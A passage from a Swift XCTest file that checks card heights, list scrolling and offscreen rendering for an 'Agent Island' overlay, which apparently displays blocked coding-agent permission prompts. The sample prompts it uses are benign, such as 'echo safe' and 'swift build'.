        safeTop: 32)

    func testCardHeightsAndTheIslandGrowsForThem() throws {
        let bash = AgentCard.prompt(try prompt(bashScreen))
        // 8 + 20 question + (3 * 14 + 8 + 6) context + 4 buttons * 26 + 8 + 4 gap
        XCTAssertEqual(AgentIslandGeometry.cardHeight(bash), 200)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.changed), 8 + 20 + 26 + 8 + 4)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([])), 8 + 26 + 8 + 4, "jump only")
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context(["a", "b"])), 8 + (28 + 14) + 26 + 8 + 4)
        // over the cap: 8 + 20 question + (9 * 14 + 8 + 6) head + marker + 20 caption + 4 buttons * 26 + 8 + 4
        let overCap: CGFloat = 8 + 20 + (9 * 14 + 8 + 6) + 20 + 4 * 26 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(longCommand)))), overCap)
        // ask: 8 + 20 question + (1 * 14 + 8 + 6) context + 7 buttons * 26 + 4 detail lines * 14 + 8 + 4
        let ask: CGFloat = 8 + 20 + (14 + 8 + 6) + 7 * 26 + 4 * 14 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(askFourScreen))), ask)
        // W1: wrapped rows count, not screen lines.
        let wrapped = try prompt(bash21([longLine])).layout.context.count
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21([longLine])))),
                       8 + 20 + (CGFloat(wrapped) * 14 + 8 + 6) + 4 * 26 + 8 + 4)
        // past the cap by wrapping: 8 rows + marker, the caption row
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(wideCommand)))), overCap)
        // a wide label: the caption row and the label's continuation rows (16 each)
        let wide = try prompt(bash21(["echo safe"], allow: wideAllow)), extra = wide.layout.labels[1].count - 1
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(wide)),
                       8 + 20 + (14 + 8 + 6) + 20 + 4 * 26 + CGFloat(extra) * 16 + 8 + 4)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([longLine])),
                       8 + (CGFloat(wrapped) * 14 + 14) + 26 + 8 + 4, "the context-only card wraps too")

        XCTAssertEqual(notched.expandedSize(rows: 3, cards: 200).height, notched.expandedSize(rows: 3).height + 200,
                       "grown, not clipped")
        XCTAssertFalse(notched.listScrolls(rows: 3, cards: 200))
        XCTAssertEqual(notched.maxListHeight, 982 - 32 - 4 - 12 - 40)
        XCTAssertEqual(notched.listHeight(rows: 6, cards: 2000), notched.maxListHeight, "capped above the screen bottom")
        XCTAssertTrue(notched.listScrolls(rows: 6, cards: 2000))
        XCTAssertTrue(notched.listScrolls(rows: 7))
    }

    @MainActor
    func testStoreCountsCardsOfBlockedRowsOnly() throws {
        let store = AgentIslandStore(geometry: notched)
        let b = AgentSession(key: AgentSessionKey(dir: "/d", name: "b"), alias: "", activity: 1, state: .blocked, agents: 0)
        let w = AgentSession(key: AgentSessionKey(dir: "/d", name: "w"), alias: "", activity: 1, state: .working, agents: 0)
        store.sessions = [b, w]
        store.expanded = true
        store.cards = [b.key: .changed, w.key: .changed]
        XCTAssertEqual(store.card(for: b), .changed)
        XCTAssertNil(store.card(for: w), "a card left over on a row that stopped blocking is not shown")
        XCTAssertEqual(store.size, notched.expandedSize(rows: 2, cards: AgentIslandGeometry.cardHeight(.changed)))
    }

    // MARK: - Render (visual evidence, no window)

    @MainActor
    func testRendersBashAndAskCardsOffscreen() throws {
        let now = Date().timeIntervalSince1970
        let out = tempDir()
        let extra = ProcessInfo.processInfo.environment["PROSPER_RENDER_DIR"].map { URL(fileURLWithPath: $0) }
        for (name, alias, screen) in [("agent-island-card-bash", "clean rebuild", bashScreen),
                                      ("agent-island-card-ask", "deploy the release", askFourScreen),
                                      ("agent-island-card-overcap", "long command", bash21(longCommand)),
                                      ("agent-island-card-wrapped", "allow a long path",
                                       bash21(["swift build"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project")),
                                      ("agent-island-card-longcommand", "install deps", bash21([longLine, cjkLine])),
                                      ("agent-island-card-widelabel", "allow a wide path", bash21(["swift build"], allow: wideAllow)),
                                      ("agent-island-card-hidden", "hidden characters", hiddenScreen)] {
            let store = AgentIslandStore(geometry: notched)
            let blocked = AgentSession(key: AgentSessionKey(dir: "/d", name: "fix-auth"), alias: alias,
                                       activity: now - 12, state: .blocked, agents: 0)
            store.sessions = [blocked,
                              AgentSession(key: AgentSessionKey(dir: "/d", name: "prosper-ios"), alias: "",
                                           activity: now - 240, state: .working, agents: 2),
                              AgentSession(key: AgentSessionKey(dir: "/d", name: "payhawk-apps"),
                                           alias: "ship release notes", activity: now - 7200, state: .done, agents: 0)]
            store.cards[blocked.key] = AgentPrompt.card(screen: screen)
            store.expanded = true
            let r = ImageRenderer(content: AgentIslandView(store: store).padding(20).background(Color(white: 0.75)))
            r.scale = 2
            let cg = try XCTUnwrap(r.cgImage, name)
            XCTAssertEqual(CGFloat(cg.width), (store.size.width + 40) * 2, name)
            XCTAssertEqual(CGFloat(cg.height), (store.size.height + 40) * 2, name)
            let png = try XCTUnwrap(NSBitmapImageRep(cgImage: cg).representation(using: .png, properties: [:]))
            try png.write(to: out.appendingPathComponent("\(name).png"))
            if let extra { try png.write(to: extra.appendingPathComponent("\(name).png")) }
        }
    }
}
